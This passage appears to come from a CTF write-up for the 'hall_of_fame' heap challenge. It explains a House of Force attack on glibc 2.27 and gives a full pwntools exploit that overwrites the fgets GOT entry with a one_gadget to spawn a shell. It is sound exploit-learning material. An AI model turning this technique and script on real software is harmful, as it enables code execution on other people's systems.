<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>av-&gt;top = x = old_top_chunk + nb
</span></span><span style="display:flex;"><span>x = old_top_chunk + input_size + 8
</span></span><span style="display:flex;"><span>input_size = x - old_top_chunk - 8
</span></span></code></pre></td></tr></table>
</div>
</div><p>So, if we call <code>malloc(input_size)</code>, we will pivot the heap top_chunk to our desired address, and then when we call the next <code>malloc</code>, the chunk will point to our desired address, and we can overwrite its value.</p>
<p>Back to the code, remember that we got the leak address of the libc and the heap stack, which mean we can easily get the <code>old_top_chunk</code> address, and also we can easily calculate the <code>offset</code> of our targeted libc function.</p>
<p>Let&rsquo;s checksec the given binary first.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      No PIE (0x3ff000)
</span></span></code></pre></td></tr></table>
</div>
</div><p>The RELRO is Partial RELRO, which mean we can overwrite the GOT table. Now, let&rsquo;s use <code>one_gadget</code> on the given libc,</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0x4f2a5 execve(&#34;/bin/sh&#34;, rsp+0x40, environ)
</span></span><span style="display:flex;"><span>constraints:
</span></span><span style="display:flex;"><span>  rsp &amp; 0xf == 0
</span></span><span style="display:flex;"><span>  rcx == NULL
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>0x4f302 execve(&#34;/bin/sh&#34;, rsp+0x40, environ)
</span></span><span style="display:flex;"><span>constraints:
</span></span><span style="display:flex;"><span>  [rsp+0x40] == NULL
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>0x10a2fc execve(&#34;/bin/sh&#34;, rsp+0x70, environ)
</span></span><span style="display:flex;"><span>constraints:
</span></span><span style="display:flex;"><span>  [rsp+0x70] == NULL
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, because we already got the leaked libc base address, we can simply try to overwrite the GOT table with one of the result, so that we can get shell.</p>
<p>Gathering all of the knowledge, our general plan is:</p>
<ul>
<li>Use the first menu (Add Hall of Fame) with size &lt; 0x20, and then overwrite the top_chunk size with 0xFFFFFFFFFFFFFFFF</li>
<li>Use the second menu to leak the heap address and puts libc address, so that we can calculate the top_chunk address and shell_address that we got from one_gadget.</li>
<li>Use the first menu to malloc with the calculated size, so that the top_chunk will point to our desired address</li>
<li>Use the first menu again, to overwrite the GOT table with our shell address</li>
</ul>
<h3 id="solution-2">Solution <a href="#solution-2" class="anchor">#</a></h3>
<p>In order to implement our plan, some key notes that we need to consider:</p>
<ul>
<li>Let say that we target to overwrite address <code>0x808080</code>, then we need to pivot the top_chunk to <code>0x808080-0x10</code>, because the first <code>0x10</code> space will be used to store the metadata.</li>
<li>It&rsquo;s okay to send negative value to the malloc size, as it will be converted to unsigned anyway.</li>
<li>It&rsquo;s better for us to just overwrite the whole GOT table (which mean our <code>desired_address</code> should be smaller than the GOT first entry address), so that we don&rsquo;t overwrite the GOT function with the top_chunk metadata (which can caused segfault during execution).</li>
<li>Notes that the <code>one_gadget</code> returned address has contstraint where the value of <code>[rsp+0xXX]</code> should be nil. This means that we might need to heuristically try one-by-one which GOT function fulfill the constraint, so that we can replace it with the <code>one_gadget</code> address.</li>
</ul>
<p>During the CTF:</p>
<ul>
<li>We pivot the <code>top_chunk</code> address to <code>0x602000</code>, which is the start of GOT section.</li>
<li>We found that replacing <code>fgets</code> with the <code>one_gadget</code> fulfill the constraint. So, we carefully overwrite the GOT function which located before <code>fgets</code> with the correct address.</li>
</ul>
<p>So, below is our full script to do that:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">78
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">79
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">80
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">81
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">82
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">83
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">84
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">85
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">86
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">87
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">88
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">89
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">90
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>arch <span style="color:#555">=</span> <span style="color:#c30">&#39;amd64&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>encoding <span style="color:#555">=</span> <span style="color:#c30">&#39;latin&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>log_level <span style="color:#555">=</span> <span style="color:#c30">&#39;INFO&#39;</span>
</span></span><span style="display:flex;"><span>warnings<span style="color:#555">.</span>simplefilter(<span style="color:#c30">&#34;ignore&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#555">=</span> ELF(<span style="color:#c30">&#34;./hall_of_fame_patched&#34;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#555">=</span> ELF(<span style="color:#c30">&#34;./libc-2.27.so&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>binary <span style="color:#555">=</span> exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">conn</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> args<span style="color:#555">.</span>LOCAL:
</span></span><span style="display:flex;"><span>        r <span style="color:#555">=</span> process([exe<span style="color:#555">.</span>path])
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> args<span style="color:#555">.</span>PLT_DEBUG:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#555">.</span>attach(r)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#555">=</span> remote(<span style="color:#c30">&#34;fun.chall.seetf.sg&#34;</span>, <span style="color:#f60">50004</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">add</span>(r, score, name):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Choose&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;score? &gt; &#39;</span>, score)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Famer &gt; &#39;</span>, name)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">view</span>(r):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Choose&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;is at &#39;</span>)
</span></span><span style="display:flex;"><span>    heap_pointer <span style="color:#555">=</span> <span style="color:#366">int</span>(r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip(), <span style="color:#f60">16</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;is at &#39;</span>)
</span></span><span style="display:flex;"><span>    leaked_puts <span style="color:#555">=</span> <span style="color:#366">int</span>(r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip(), <span style="color:#f60">16</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> heap_pointer, leaked_puts
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r <span style="color:#555">=</span> conn()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Overwrite top_chunk size with 0xFFFFFFFFFFFFFFFF</span>
</span></span><span style="display:flex;"><span>add(r, <span style="color:#366">str</span>(<span style="color:#f60">0x2</span>)<span style="color:#555">.</span>encode(), <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">0x10</span><span style="color:#555">+</span>p64(<span style="color:#555">-</span><span style="color:#f60">1</span>, signed<span style="color:#555">=</span><span style="color:#069;font-weight:bold">True</span>)<span style="color:#555">+</span>p64(<span style="color:#555">-</span><span style="color:#f60">1</span>, signed<span style="color:#555">=</span><span style="color:#069;font-weight:bold">True</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Get heap address and libc address</span>
</span></span><span style="display:flex;"><span>heap_pointer, leaked_puts <span style="color:#555">=</span> view(r)
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Leaked heap: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(heap_pointer)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Leaked puts: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(leaked_puts)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Calculate libc base address</span>
</span></span><span style="display:flex;"><span>libc<span style="color:#555">.</span>address <span style="color:#555">=</span> leaked_puts <span style="color:#555">-</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;puts&#39;</span>]
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Libc base: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(libc<span style="color:#555">.</span>address)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Calculate top chunk address</span>
</span></span><span style="display:flex;"><span>top <span style="color:#555">=</span> heap_pointer<span style="color:#555">+</span><span style="color:#f60">0x18</span>
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Top Chunk: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(top)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Calculate the correct malloc size, so that the top_chunk will point to 0x602000</span>
</span></span><span style="display:flex;"><span>num <span style="color:#555">=</span> <span style="color:#f60">0x602000</span><span style="color:#555">-</span>top<span style="color:#555">-</span><span style="color:#f60">0x8</span>
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Num: </span><span style="color:#a00">{</span>num<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Call malloc, and after the call, top_chunk will point to 0x602000</span>
</span></span><span style="display:flex;"><span>add(r, <span style="color:#366">str</span>(num)<span style="color:#555">.</span>encode(), p64(libc<span style="color:#555">.</span>address<span style="color:#555">+</span><span style="color:#f60">0x10a2fc</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">Carefully craft payload to overwrite the GOT table,
</span></span></span><span style="display:flex;"><span><span style="color:#c30">so that only fgets got replaced with the one_gadget address
</span></span></span><span style="display:flex;"><span><span style="color:#c30">
</span></span></span><span style="display:flex;"><span><span style="color:#c30">Notes that 0x602000 will contain the chunk metadata,
</span></span></span><span style="display:flex;"><span><span style="color:#c30">so when we next call malloc and fill its content, it
</span></span></span><span style="display:flex;"><span><span style="color:#c30">will start from 0x602010. So keep in mind that our
</span></span></span><span style="display:flex;"><span><span style="color:#c30">payload will start from 0x602010.
</span></span></span><span style="display:flex;"><span><span style="color:#c30">
</span></span></span><span style="display:flex;"><span><span style="color:#c30">From observation in GDB, below is the GOT table structure
</span></span></span><span style="display:flex;"><span><span style="color:#c30">[0x602018] __stack_chk_fail@GLIBC_2.4  →  0x400716
</span></span></span><span style="display:flex;"><span><span style="color:#c30">[0x602020] printf@GLIBC_2.2.5  →  0x7ffff7a46e40
</span></span></span><span style="display:flex;"><span><span style="color:#c30">[0x602028] strcspn@GLIBC_2.2.5  →  0x400736
</span></span></span><span style="display:flex;"><span><span style="color:#c30">[0x602030] sbrk@GLIBC_2.2.5  →  0x7ffff7af8160
</span></span></span><span style="display:flex;"><span><span style="color:#c30">[0x602038] fgets@GLIBC_2.2.5  →  0x7ffff7a60ad0
</span></span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>shell_addr <span style="color:#555">=</span> libc<span style="color:#555">.</span>address<span style="color:#555">+</span><span style="color:#f60">0x10a2fc</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span>  p64(<span style="color:#f60">0</span>) <span style="color:#09f;font-style:italic"># Safe to be replaced by any bytes as it isn&#39;t the first GOT table entry address</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;__stack_chk_fail&#39;</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;printf&#39;</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;strcspn&#39;</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;sbrk&#39;</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(shell_addr) <span style="color:#09f;font-style:italic"># Overwrite fgets</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Call malloc, and overwrite it</span>
</span></span><span style="display:flex;"><span>add(r, <span style="color:#366">str</span>(<span style="color:#f60">10</span>)<span style="color:#555">.</span>encode(), payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># We got our shell</span>
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>interactive()
</span></span></code></pre></td></tr></table>
</div>
